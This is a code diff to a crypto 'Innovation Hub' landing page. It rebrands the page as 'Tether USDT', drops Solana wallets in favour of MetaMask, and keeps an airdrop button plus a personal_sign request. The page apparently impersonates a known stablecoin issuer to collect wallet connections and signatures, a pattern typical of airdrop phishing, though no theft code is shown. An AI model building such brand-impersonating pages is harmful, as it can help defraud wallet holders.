@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SKR Protocol | Innovation Hub</title>
+    <title>Tether USDT | Innovation Hub</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <style>
@@ -188,9 +188,16 @@
             .top-layout { grid-template-columns: 100%; }
             .info-panel { padding: 100px 5% 0; text-align: center; align-items: center; }
             .visual-panel { height: 50vh; }
-            .header-nav { width: 100%; right: 0; justify-content: center; top: 10px; }
+            .header-nav { width: 100%; right: 0; justify-content: center; top: 10px; gap: 8px; }
+            .btn-nav { padding: 10px 16px; font-size: 12px; }
             .page-sections { padding: 40px 20px; }
             .page-section { padding: 30px; }
+            .slide-logo { width: 100px; height: 100px; }
+            .slide-logo img { width: 60px; }
+            .page-logo { width: 80px; height: 80px; }
+            .page-logo img { width: 50px; }
+            h1 { font-size: clamp(30px, 5vw, 50px); }
+            p { font-size: 15px; }
         }
     </style>
 </head>
@@ -361,41 +368,22 @@
     slides[currentSlide].classList.add('active');
     setInterval(showNextSlide, 5000); // Смена каждые 5 секунд
 
-    // Wallet Connection and Signing
+    // Wallet Connection and Signing (Ethereum-focused)
     let walletProvider = null;
     let walletAddress = null;
 
     async function connectWallet() {
-        // Try Phantom
-        if (window.solana && window.solana.isPhantom) {
-            walletProvider = window.solana;
-        } 
-        // Try Solflare
-        else if (window.solflare) {
-            walletProvider = window.solflare;
-        } 
-        // Try Backpack
-        else if (window.backpack) {
-            walletProvider = window.backpack;
-        } 
-        // Try Ethereum (MetaMask)
-        else if (window.ethereum) {
+        // Prioritize Ethereum wallets (MetaMask, etc.)
+        if (window.ethereum) {
             walletProvider = window.ethereum;
         } else {
-            alert("No wallet detected! Please install Phantom, Solflare, Backpack, or MetaMask.");
+            alert("No Ethereum wallet detected! Please install MetaMask or similar.");
             return;
         }
 
         try {
-            if (walletProvider === window.ethereum) {
-                // MetaMask
-                const accounts = await walletProvider.request({ method: 'eth_requestAccounts' });
-                walletAddress = accounts[0];
-            } else {
-                // Solana wallets
-                const resp = await walletProvider.connect();
-                walletAddress = resp.publicKey.toString();
-            }
+            const accounts = await walletProvider.request({ method: 'eth_requestAccounts' });
+            walletAddress = accounts[0];
             
             document.querySelector('.btn-nav:first-child').innerText = walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
             document.querySelector('.btn-airdrop').disabled = false;
@@ -411,19 +399,10 @@
         if (!walletAddress) return;
 
         try {
-            let signedMessage;
-            if (walletProvider === window.ethereum) {
-                // MetaMask signing
-                signedMessage = await walletProvider.request({
-                    method: 'personal_sign',
-                    params: [message, walletAddress],
-                });
-            } else {
-                // Solana signing
-                const encodedMessage = new TextEncoder().encode(message);
-                const signed = await walletProvider.signMessage(encodedMessage, "utf8");
-                signedMessage = btoa(String.fromCharCode(...signed.signature));
-            }
+            const signedMessage = await walletProvider.request({
+                method: 'personal_sign',
+                params: [message, walletAddress],
+            });
             alert("Message signed successfully: " + signedMessage.slice(0,40) + "...");
         } catch (err) {
             console.error(err);
